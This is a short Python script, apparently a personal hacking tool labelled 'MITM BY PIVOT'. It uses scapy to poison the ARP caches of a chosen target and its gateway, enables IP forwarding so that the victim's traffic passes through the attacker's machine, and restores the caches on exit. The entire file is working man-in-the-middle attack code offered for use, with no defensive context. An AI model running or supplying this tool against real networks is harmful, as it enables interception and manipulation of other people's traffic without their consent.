import os
import scapy.all as scapy
import time
import optparse
os.system("figlet MITM BY PIVOT")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")#Ip Forwarding

def params():
    parse = optparse.OptionParser()
    parse.add_option("-t","--targetip",dest="target_ip",help="Enter Target Ip")
    parse.add_option("-r","--rhost",dest="modem_ip",help="Enter Modem Ip")
    arguments = parse.parse_args()[0]
    if not arguments.target_ip:
        print("Enter Target IP")
    if not arguments.modem_ip:
        print("Enter Modem IP")
    return arguments

def findMacAdress(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")#For Default MAC. All MAC adress Accept this default and tell me original MAC adress. This is sent to modem
    packet = broadcast/request #Combine packet Related to scapy
    sucess = scapy.srp(packet,timeout=1,verbose=False)[0]#send packet
    return sucess[0][1].hwsrc

def arp(targetIp,secondIp):
    macAdress = findMacAdress(targetIp)
    arp_packet = scapy.ARP(op=2,pdst=targetIp,hwdst=macAdress,psrc=secondIp)#op = 2 Response psrc => who you want to make yourself look like
    scapy.send(arp_packet,verbose=False)

def reset(ip1,ip2):
    macAdress = findMacAdress(ip1)
    secondMac = findMacAdress(ip2)
    arp_packet = scapy.ARP(op=2,pdst=ip1,hwdst=macAdress,psrc=ip2,hwsrc=secondMac)
    scapy.send(arp_packet,verbose=False,count=5)


count = 0
start=params()
target = start.target_ip
modem = start.modem_ip

try:
    while True:
        arp(target,modem)
        arp(modem,target)
        count+=2
        print("\rNumber of successful packets {}".format(count),end="")
        time.sleep(1)
except KeyboardInterrupt :
    print("\nExiting...")
    reset(target,modem)
    reset(modem,target)
